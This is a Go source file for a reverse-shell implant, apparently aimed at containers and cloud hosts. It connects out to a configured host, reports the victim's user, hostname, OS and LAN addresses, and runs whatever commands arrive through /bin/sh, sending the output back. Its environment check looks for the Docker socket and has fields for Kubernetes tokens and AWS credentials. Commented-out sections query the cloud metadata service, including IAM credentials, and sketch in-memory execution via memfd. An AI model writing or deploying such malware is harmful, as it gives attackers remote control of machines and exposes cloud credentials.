package main

import (
    "fmt"
    "net"
    "os"
    "errors"
    "os/exec"
    "os/user"
    "io"
    "bufio"
    "strings"
    "encoding/json"
    _ "net/http"
    "log"
    "runtime"
    _ "io/ioutil"
    _ "reflect"
)


var HOST = "127.0.0.1"
var PORT = "443"



func EncryptDecrypt(input, key string) (output string) {
    for i := 0; i < len(input); i++ {
            output += string(input[i] ^ key[i % len(key)])
    }

    return output
}

type uname struct {
    arch string `json:arch`
    version string `json:version`
    release string `json:release`
}

type aws_creds struct {
    profile string `json:profile`
    AWS_KEY string `json:AWS_KEY`
    SECRET_KEY string `json:SECRET_KEY`
    SESSION_TOKEN string `json:SESSION_TOKEN`
    region string `json:region`
}

type check_env struct {
    SYSTEM string `json:SYSTEM`
    USER string `json:USER`
    UNAME uname `json:UNAME`
    HOSTNAME string `json:HOSTNAME`
    INIT string `json:INIT`
    DOCKSOCK bool `json:DOCKSOCK`
    PRIVILEGED bool `json:PRIVILEGED`
    DISKS []string `json:DISKS`
    KUBETOKEN string `json:KUBETOKEN`
    AWS_CREDS aws_creds `json:AWS_CREDS`
    META_DATA aws_creds `json:META-DATA`
}

/*
type metadata struct {
    status_code int `json:status_code`

}

func meta_data(){
    all_metadata := metadata {
        status_code: 0,

    }

    metatest := map[string]string {
        "user-data":"user-data",
        "ami-id":"meta-data/ami-id",
        "instance-id":"meta-data/instance-id",
        "instance-type":"meta-data/instance-type",
        "local-ipv4":"meta-data/local-ipv4",
        "local-hostname": "meta-data/local-hostname",
        "public-ipv4":"meta-data/public-ipv4",
        "public-hostname": "meta-data/public-hostname",
        "security-groups":"meta-data/security-groups",
        "reservation-id":"meta-data/reservation-id",
    }

    iam_metatest := map[string]string {
        "iam-info": "meta-data/iam/info",
        "ec2-role": "meta-data/iam/security-credentials/",
    }

    adv_metatest := map[string]string {
        "macs": "network/interfaces/macs",
    }

    interfaces := map[string]string {
        "interface-id":"interface-id",
        "local-hostname":"local-hostname",
        "local-ipv4s":"local-hostname",
        "public-hostname": "public-hostname",
        "public-ipv4s": "public-hostname",
        "security-groups": "security-groups",
        "security-group-id": "security-group-ids",
        "subnet-ipv4-cidr-block": "subnet-ipv4-cidr-block",
        "vpc-id": "vpc-id",
        "vpc-ipv4-cidr-block": "vpc-ipv4-cidr-block",
        "vpc-ipv4-cidr-blocks": "vpc-ipv4-cidr-blocks",
    }

    var metalink = "http://169.254.169.254"

    check_meta_access, meta_access_error := http.Get(fmt.Sprintf("%s/lastest", metalink))
    if check_meta_access.StatusCode == 200{
        all_metadata.status_code = 200


    }else if check_meta_access.StatusCode == 401{
        all_metadata.status_code = 401
    }else if check_meta_access.StatusCode == 404{
        all_metadata.status_code = 404
    }else{
        all_metadata.status_code = check_meta_access.StatusCode
    }


    if meta_access_error == nil {
        for key, element := range interfaces{
            link := fmt.Sprintf("%s/%s", metalink, element)
            fmt.Println(link)
            resp, err := http.Get(link)

            if err != nil {
                log.Fatal(err)
            }

            defer resp.Body.Close()
            body, err := ioutil.ReadAll(resp.Body)
            if err != nil {
                log.Fatal(err)
            }
            bodyString := string(body)
            response_body := fmt.Sprintf("%s: %s", key, bodyString)
            fmt.Println(response_body)
        }
    }
}
*/

func dockersock_Exists() (bool) {
    _, err := os.Stat("/var/run/docker.sock")
    if err == nil {
        return true
    }
    if errors.Is(err, os.ErrNotExist) {
        return false
    }
    return false
}

func init_info(system string) (string){
    uname_map :=  uname{
        arch:   "",
        version:"",
        release:"",
    }

    aws_creds_map := aws_creds{
        profile:        "",
        AWS_KEY:        "",
        SECRET_KEY:     "",
        SESSION_TOKEN:  "",
        region:         "",
    }

    //var disks [100]string
    var disks []string

    check_env_map := &check_env{
        SYSTEM:     "",
        USER:       "",
        UNAME:      uname_map,
        HOSTNAME:   "",
        INIT:       "",
        DOCKSOCK:   false,
        PRIVILEGED: false,
        DISKS:      disks,
        KUBETOKEN:  "",
        AWS_CREDS:  aws_creds_map,
    }


    //ENV struct `json:ENV` {}
    /*uname := map[string]string{
        arch string `json:arch`
        version string `json:version`
        release string `json:release`
    }*/

    check_env_map.SYSTEM = system

    //---------------------------
    //Username
    user, err := user.Current()
    if err != nil {
        log.Fatalf(err.Error())
    }

    username := user.Username
    check_env_map.USER = username

    if dockersock_Exists(){
        check_env_map.DOCKSOCK = true
    }

    /*
    //---------------------------
    utsname := &syscall.Utsname{}
    //uname := charsToString(utsname.Machine)
    uname := utsname.Machine
    fmt.Println(uname)
    */

    json_check_env, err := json.Marshal(check_env_map)
    return fmt.Sprintf("%sdone",string(json_check_env))

}

func main() {
    var ips []string

    type infostruct struct {
        USER string `json:USER`
        SYSTEM string `json:SYSTEM`
        HOSTNAME string `json:HOSTNAME`
        LAN_IP []string `json:LAN_IP`
    }

    info := infostruct{
        USER:     "",
        SYSTEM:   "",
        HOSTNAME: "",
        LAN_IP:   ips,
    }

    ifaces, err := net.Interfaces()
    if err != nil {
        fmt.Print(fmt.Errorf("localAddresses: %+v\n", err.Error()))
        return
    }

    for _, i := range ifaces {
        addrs, err := i.Addrs()
        if err != nil {
            continue
        }
        if len(addrs) > 0{
            address := (addrs[0]).String()
            has127 := strings.Contains(address, "127")
            if has127{
                continue
            }else{
                info.LAN_IP = append(info.LAN_IP, address)
            }
        }
    }

    user, err := user.Current()
    hostname, err := os.Hostname()
    var system = runtime.GOOS

    info.USER = user.Username
    info.SYSTEM = system
    info.HOSTNAME = hostname

    socket_info, _ := json.Marshal(info)

    fmt.Println(string(socket_info))

    sock := fmt.Sprintf("%s:%s", HOST, PORT)
    fmt.Println(sock)

    fmt.Println(system)
    conn, err := net.Dial("tcp", sock)
    if err == nil {
        fmt.Println("Connection successful")
    }

    for {
        msg, msgerr := bufio.NewReader(conn).ReadString('\n')
        fmt.Println(msg)
        if msgerr != nil {
            fmt.Println("Error on MSG")
            conn.Close()
        }
        thecomm := strings.TrimSpace(string(msg))
        comm := strings.TrimSuffix(thecomm, "done")
        fmt.Println(thecomm)
        fmt.Println(comm)

        fmt.Println(msg)
        fmt.Println(comm)

        if comm == "exit" || comm == "quit"{
            fmt.Println("TCP client exiting...")
            conn.Close()

        /*}else if comm == "run_in_memory"{
            var n = 2
            b := make([]byte, n)
            for i := range b {
                b[i] = letterBytes[rand.Intn(len(letterBytes))]
            }

            Data, err := getURLContent(path)

            mfd, err := memfd.Create()
            mfd.Write(Data)
            filePath := fmt.Sprintf("/proc/self/fd/%d", mfd.Fd())
            cmd := exec.Command(filePath)
            out, err := cmd.Run()
        */
        }else if comm == "check_env"{
            var info string = init_info(system)
            if _, err := conn.Write([]byte(info)); err != nil {
                conn.Close()
            }

        }else{
            fmt.Println("Executing Command...")
            var cmd *exec.Cmd

            command := strings.NewReader(comm)
            cmd = exec.Command("/bin/sh", "-i")
            rp, wp := io.Pipe()
            //cmd.Stdin, _ = bufio.NewReader(conn).ReadString('\n')
            cmd.Stdin = command
            cmd.Stdout = wp
            go io.Copy(conn, rp)

            if err := cmd.Run(); err != nil {
                fmt.Println("Error: ", err)
        }
        }
    }
}
